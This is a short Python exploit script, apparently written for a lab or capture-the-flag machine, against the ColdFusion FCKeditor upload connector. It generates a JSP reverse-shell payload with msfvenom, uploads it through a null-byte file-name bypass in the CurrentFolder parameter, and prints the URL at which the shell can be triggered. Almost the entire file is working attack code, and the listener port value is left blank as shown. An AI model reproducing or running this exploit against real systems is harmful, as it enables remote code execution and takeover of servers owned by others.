#!/bin/python3

import os
import requests

def delete_payload_file(fl):
	print("\nDeleting payload file...")
	os.system(f'rm {fl}.jsp')

if __name__ == '__main__':
	lhost = ' '
	lport = 
	rhost = '10.10.10.11'
	rport = 8500
	filename = "x"
	basepath = f"http://{rhost}:{rport}"
		
	# Generating payload
	print("\nmsfvenom is generating payload...")
	os.system(f'msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -o {filename}.jsp')
	with open(f'{filename}.jsp', 'r') as payload:
		body = payload.read()

	print("\nSending payload...")

	try:
		req = requests.post(f"{basepath}/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/{filename}.jsp%00", files={'newfile': (f'{filename}.txt', body, 'text/plain')}, timeout=90)
		if req.status_code == 200:
			print("\nPayload was successfully uploaded!\nPath: " + basepath + f"/userfiles/file/{filename}.jsp")
		else:
			print("\nFailed to upload: " + str(req.status_code) + ' ' + req.reason)
		
		delete_payload_file(filename)
	except requests.Timeout:
		print("\nFailed...Request timed out")
		delete_payload_file(filename)
